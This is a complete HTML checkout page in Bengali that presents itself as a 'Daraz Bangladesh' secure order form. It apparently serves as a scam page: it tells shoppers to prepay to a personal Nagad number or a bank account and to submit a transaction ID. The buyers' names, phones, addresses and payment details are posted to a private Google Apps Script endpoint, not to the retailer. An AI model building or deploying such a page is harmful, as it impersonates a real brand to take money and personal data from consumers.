<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>নিরাপদ অর্ডার ফর্ম | Daraz Bangladesh</title>
    
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>

    <style>
        :root { --daraz-orange: #f85606; --bg-gray: #f5f6fa; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background-color: var(--bg-gray); padding: 15px 10px; }
        
        .order-container { max-width: 480px; margin: 0 auto; background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.06); }
        .order-header { background: var(--daraz-orange); color: white; padding: 15px; text-align: center; font-size: 16px; font-weight: bold; }
        
        /* Product Preview */
        .product-summary { display: flex; padding: 15px; background: #fff8f5; border-bottom: 1px dashed #ffd5c4; align-items: center; }
        .product-summary img { width: 65px; height: 65px; object-fit: cover; border-radius: 6px; border: 1px solid #ffccb5; }
        .product-det { margin-left: 12px; }
        .product-det h3 { font-size: 14px; color: #333; margin-bottom: 4px; }
        .product-det p { font-size: 16px; color: var(--daraz-orange); font-weight: bold; }
        
        /* Form Styling */
        .form-body { padding: 15px; }
        .form-title { font-size: 14px; font-weight: bold; margin-bottom: 12px; color: #444; border-left: 3px solid var(--daraz-orange); padding-left: 6px; }
        .input-group { margin-bottom: 12px; }
        label { display: block; font-size: 13px; font-weight: bold; color: #555; margin-bottom: 4px; }
        input[type="text"], input[type="number"], textarea { width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 6px; font-size: 13px; outline: none; }
        input:focus, textarea:focus { border-color: var(--daraz-orange); }
        
        /* Payment Options Box */
        .payment-box { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px; margin-bottom: 15px; }
        .payment-method { display: flex; align-items: center; background: white; border: 1px solid #ddd; padding: 10px; border-radius: 6px; margin-bottom: 10px; cursor: pointer; position: relative; }
        .payment-method img { height: 24px; object-fit: contain; margin-left: 10px; }
        .payment-method input { margin-right: 8px; width: 16px; height: 16px; }
        .account-details { display: none; font-size: 12px; background: #fff8f5; border: 1px solid #ffccb5; padding: 8px; border-radius: 4px; margin-top: -5px; margin-bottom: 10px; color: #333; }
        
        .confirm-btn { width: 100%; background: #00b74a; color: white; border: none; padding: 14px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 10px rgba(0,183,74,0.2); }
        .confirm-btn:hover { background: #00963c; }
    </style>
</head>
<body>

    <div class="order-container">
        <div class="order-header"><i class="fa-solid fa-shield-halved"></i> আপনার অর্ডারটি সম্পূর্ণ করুন</div>
        
        <!-- Product Loaded from URL query -->
        <div class="product-summary">
            <img id="orderProdImg" src="https://via.placeholder.com/65" alt="">
            <div class="product-det">
                <h3 id="orderProdName">প্রোডাক্টের নাম লোড হচ্ছে...</h3>
                <p id="orderProdPrice">৳ 0.00</p>
            </div>
        </div>
        
        <form class="form-body" id="orderSubmitForm">
            <div class="form-title">কাস্টমার ডেলিভারি তথ্য</div>
            
            <div class="input-group">
                <label>আপনার সম্পূর্ণ নাম *</label>
                <input type="text" id="custName" placeholder="যেমন: মোঃ হাসান" required>
            </div>
            
            <div class="input-group">
                <label>মোবাইল নাম্বার *</label>
                <input type="number" id="custPhone" placeholder="যেমন: 017XXXXXXXX" required>
            </div>
            
            <div class="input-group">
                <label>সম্পূর্ণ ঠিকানা (জেলা সহ) *</label>
                <textarea id="custAddress" rows="2" placeholder="যেমন: গ্রাম, ডাকঘর, থানা, জেলা..." required></textarea>
            </div>
            
            <div class="form-title">পেমেন্ট মেথড সিলেক্ট করুন</div>
            <div class="payment-box">
                <!-- Cash On Delivery Option -->
                <div class="payment-method" onclick="selectPayment('cod')">
                    <input type="radio" name="payMethod" id="payCod" value="Cash On Delivery" checked>
                    <label for="payCod" style="margin-bottom:0; cursor:pointer;"><strong>ক্যাশ অন ডেলিভারি</strong> (হাতে পেয়ে টাকা দিবেন)</label>
                </div>
                
                <!-- Nagad Option with Logo -->
                <div class="payment-method" onclick="selectPayment('nagad')">
                    <input type="radio" name="payMethod" id="payNagad" value="Nagad">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Nagad_Logo.svg/320px-Nagad_Logo.svg.png" alt="Nagad">
                    <label for="payNagad" style="margin-bottom:0; cursor:pointer; margin-left:5px;"><strong>নগদ সেন্ড মানি</strong></label>
                </div>
                <div id="nagadDetails" class="account-details">
                    <i class="fa-solid fa-arrow-right-to-bracket" style="color:#f85606;"></i> এই <strong>নগদ পার্সোনাল</strong> নাম্বারে টাকা সেন্ডমানি করুন: <strong style="color:red; font-size:14px;">01707059868</strong>
                </div>

                <!-- Dutch Bangla Option with Logo -->
                <div class="payment-method" onclick="selectPayment('dbbl')">
                    <input type="radio" name="payMethod" id="payDbbl" value="Dutch Bangla Bank">
                    <img src="https://BanglarBazar.com/uploads/all/qU7Kz6V9YkGqKk18tWl9D2WwJtD3K12YxVbEskwA.webp" alt="DBBL" style="height:22px;">
                    <label for="payDbbl" style="margin-bottom:0; cursor:pointer; margin-left:5px;"><strong>ডাচ-বাংলা ব্যাংক</strong></label>
                </div>
                <div id="dbblDetails" class="account-details">
                    <i class="fa-solid fa-university" style="color:#0054ff;"></i> ডাচ-বাংলা ব্যাংক অ্যাকাউন্ট নাম্বার:<br>
                    অ্যাকাউন্ট: <strong style="color:#0054ff; font-size:14px;">3421580157514</strong>
                </div>
            </div>

            <!-- Transaction input group -->
            <div class="input-group" id="txIdGroup" style="display:none;">
                <label style="color:red;">যে নাম্বার থেকে টাকা পাঠিয়েছেন এবং TxID লিখুন *</label>
                <input type="text" id="custTxID" placeholder="যেমন: 017XX-XXXXXX, TxID: 8N7X2W">
            </div>

            <button type="submit" class="confirm-btn">
                <i class="fa-solid fa-circle-check"></i> অর্ডার নিশ্চিত করুন
            </button>
        </form>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyACgKVsEx6ec0I3OJ6fH7KemGgNmk3V2nY",
            authDomain: "daraz-bangladesh-6a0f8.firebaseapp.com",
            projectId: "daraz-bangladesh-6a0f8",
            storageBucket: "daraz-bangladesh-6a0f8.firebasestorage.app",
            messagingSenderId: "133315105065",
            appId: "1:133315105065:web:8b8fe1cd98fa61def3e738"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        let currentProductName = "";
        let currentProductPrice = "";

        // Get Product ID from Link URL
        const urlParams = new URLSearchParams(window.location.search);
        const productId = urlParams.get('id');

        if(productId) {
            db.collection("products").doc(productId).get().then((doc) => {
                if(doc.exists) {
                    const data = doc.data();
                    currentProductName = data.name;
                    currentProductPrice = data.price;
                    document.getElementById('orderProdName').innerText = data.name;
                    document.getElementById('orderProdPrice').innerText = "৳ " + data.price;
                    if(data.imageUrl) document.getElementById('orderProdImg').src = data.imageUrl;
                }
            });
        }

        // Handle Payment Selection View Change
        window.selectPayment = function(method) {
            document.getElementById('payCod').checked = (method === 'cod');
            document.getElementById('payNagad').checked = (method === 'nagad');
            document.getElementById('payDbbl').checked = (method === 'dbbl');
            
            document.getElementById('nagadDetails').style.display = (method === 'nagad') ? 'block' : 'none';
            document.getElementById('dbblDetails').style.display = (method === 'dbbl') ? 'block' : 'none';
            document.getElementById('txIdGroup').style.display = (method === 'nagad' || method === 'dbbl') ? 'block' : 'none';
            if(method === 'nagad' || method === 'dbbl') {
                document.getElementById('custTxID').required = true;
            } else {
                document.getElementById('custTxID').required = false;
            }
        }

        // Google Sheet Connection / Form Submit
        document.getElementById('orderSubmitForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const name = document.getElementById('custName').value;
            const phone = document.getElementById('custPhone').value;
            const address = document.getElementById('custAddress').value;
            const method = document.querySelector('input[name="payMethod"]:checked').value;
            const txInfo = document.getElementById('custTxID').value || "N/A";

            // Your Google Script Web App URL
            const scriptURL = 'https://script.google.com/macros/s/AKfycby7g8sK5zP_y7x0aTfC6lGqH3u0P8vjX2vjKk3O/exec'; 

            const formData = new FormData();
            formData.append('Product_Name', currentProductName);
            formData.append('Price', currentProductPrice);
            formData.append('Customer_Name', name);
            formData.append('Phone_Number', phone);
            formData.append('Full_Address', address);
            formData.append('Payment_Method', method);
            formData.append('Transaction_Info', txInfo);

            fetch(scriptURL, { method: 'POST', body: formData })
            .then(response => {
                alert("🎉 অভিনন্দন! আপনার অর্ডারটি সফলভাবে গ্রহণ করা হয়েছে। খুব শীঘ্রই আমাদের প্রতিনিধি কল করবে।");
                window.location.href = "index.html";
            })
            .catch(error => {
                alert("অর্ডার সাবমিট করতে সমস্যা হচ্ছে, আবার চেষ্টা করুন!");
            });
        });
    </script>
</body>
</html>
